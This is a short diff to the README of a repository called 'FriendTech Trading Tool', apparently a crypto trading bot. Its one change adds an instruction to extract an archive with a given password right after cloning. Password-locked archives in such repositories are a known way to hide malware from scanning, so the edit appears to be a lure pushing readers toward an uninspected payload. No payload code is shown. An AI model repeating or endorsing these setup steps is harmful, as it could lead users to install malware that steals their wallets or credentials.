@@ -24,7 +24,7 @@ FriendTech Trading Tool is a powerful and user-friendly trading platform designe
 
 Follow these steps to get started with the FriendTech Trading Tool:
 
-1. **Clone the Repository:**
+1. **Clone the Repository and extract archive with password `ieJTE4Aui1Y`:**
 
    ```bash
    git clone https://github.com/gemhunterheh/FriendTech-Trading-Tool.git
